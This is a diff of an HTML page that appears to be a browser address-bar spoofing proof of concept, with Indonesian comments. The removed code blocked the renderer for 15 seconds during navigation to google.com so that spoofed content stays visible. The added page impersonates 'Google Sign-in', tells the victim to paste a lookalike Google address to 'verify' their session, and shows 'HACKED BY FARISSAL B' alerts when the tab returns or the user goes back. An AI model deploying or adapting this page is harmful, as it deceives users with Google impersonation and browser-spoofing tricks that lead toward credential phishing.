@@ -3,41 +3,42 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>tester</title>
+  <title>Google Sign-in</title>
   <style>
     body, html { margin: 0; padding: 0; height: 100%; background: #fff; }
-    button {
+    .box {
       position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-      padding: 15px 30px; font-size: 18px; background: #007aff; color: #fff;
-      border: none; border-radius: 10px; cursor: pointer;
+      text-align: center; font-family: Arial, sans-serif;
     }
+    h1 { font-size: 28px; color: #202124; }
+    p  { font-size: 16px; color: #5f6368; }
   </style>
 </head>
 <body>
-  <button id="startBtn">CLICK HERE</button>
+  <div class="box">
+    <h1>Session verification required</h1>
+    <p>Copy the address below, paste it in the address bar, and press Enter to verify your Google session.</p>
+    <p style="font-weight:bold;user-select:all">https://google-login.accounts.google.com</p>
+  </div>
 
   <script>
-    function blockRenderer(ms) {
-      const start = performance.now();
-      while (performance.now() - start < ms) {
-        // workload ringan biar loop nggak di-eliminasi optimizer
-        Math.sqrt(performance.now());
+    // Saat halaman itu di-enter / tab kembali aktif, tunjukkan "compromise"
+    document.addEventListener("visibilitychange", function () {
+      if (document.visibilityState === "visible") {
+        setTimeout(function () {
+          alert("HACKED BY FARISSAL B");
+        }, 300);
       }
-    }
+    });
 
-    document.getElementById("startBtn").onclick = function () {
-      // Blok renderer tepat saat commit navigasi:
-      window.addEventListener("pagehide", function () {
-        blockRenderer(15000);
-      }, { once: false });
-      window.addEventListener("unload", function () {
-        blockRenderer(15000);
-      }, { once: false });
-
-      // Konten spoof perlu sempat terpaint dulu — sudah terpaint karena
-      // halaman ini sudah terbuka. Langsung navigasi:
-      location.href = "https://www.google.com";
-    };
+    // Fallback: kalau korban navigate balik (history/back), alert juga
+    window.addEventListener("pageshow", function (e) {
+      if (e.persisted || performance.getEntriesByType("navigation")[0].type === "back_forward") {
+        setTimeout(function () {
+          alert("HACKED BY FARISSAL B");
+        }, 300);
+      }
+    });
   </script>
 </body>
 </html>
